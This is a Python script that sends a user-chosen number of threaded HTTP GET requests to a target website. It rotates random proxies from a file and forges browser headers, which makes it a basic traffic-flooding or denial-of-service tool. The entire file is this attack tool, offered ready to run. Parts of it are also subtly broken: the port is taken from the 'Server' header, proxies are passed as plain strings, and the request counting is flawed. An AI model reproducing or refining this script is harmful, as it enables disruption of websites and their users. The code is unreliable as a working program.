import requests
import threading
import time
import socket
import random
from fake_headers import Headers

# Function to make a single request to a given URL using a given proxy and headers
def make_request(url, headers, proxy):
    try:
        response = requests.get(url, headers=headers, proxies=proxy)
        print(f"Status code for {url}: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error making request to {url}: {e}")

# Function to get the IP address and port number for a given URL
def get_ip_address(url):
    try:
        response = requests.get(f"http://{url}")
        server_header = response.headers.get('Server')
        if server_header:
            port = server_header.split(':')[1]
            ip_address = socket.gethostbyname(url)
            print(f"IP address for {url}: {ip_address}")
            print(f"Port number for {url}: {port}")
            return ip_address, port
    except (requests.exceptions.RequestException, socket.gaierror, IndexError) as e:
        print(f"Error getting IP address and port number for {url}: {e}")
        return None, None

# Function to send multiple requests to a given URL using a given number of threads, requests, and proxies
def send_requests(url, num_threads, num_requests, proxies):
    ip_address, port = get_ip_address(url)

    # Create a list of URLs to send requests to
    urls = [f"http://{ip_address}:{port}/"] * num_requests

    # Create a list of threads to send requests with
    threads = []

    # Keep track of the number of requests sent
    requests_sent = 0

    # Keep sending requests until the desired number of requests have been sent
    while requests_sent < num_requests:

        # For each URL, if there are less than the desired number of threads running, start a new thread
        for url in urls:
            if len(threads) < num_threads:
                proxy = random.choice(proxies)
                headers = Headers(headers=True).generate()
                thread = threading.Thread(target=make_request, args=(url, headers, proxy))
                threads.append(thread)
                thread.start()
                requests_sent += 1

        # Check if any of the threads have finished and remove them from the list of active threads
        for thread in threads:
            if not thread.is_alive():
                threads.remove(thread)

    # Wait for all threads to finish before exiting the function
    for thread in threads:
        thread.join()

# Function to load a list of proxies from a given file
def load_proxies():
    with open('proxy.txt') as f:
        proxies = [line.strip() for line in f]
    return proxies

# Main function to get user input and start sending requests
def main():
    url = input("Enter the website URL to send requests to: ")
    num_threads = int(input("Enter the number of threads to use: "))
    num_requests = int(input("Enter the number of requests to send: "))
    proxies = load_proxies()
    send_requests(url, num_threads, num_requests, proxies)

if __name__ == '__main__':
    main()
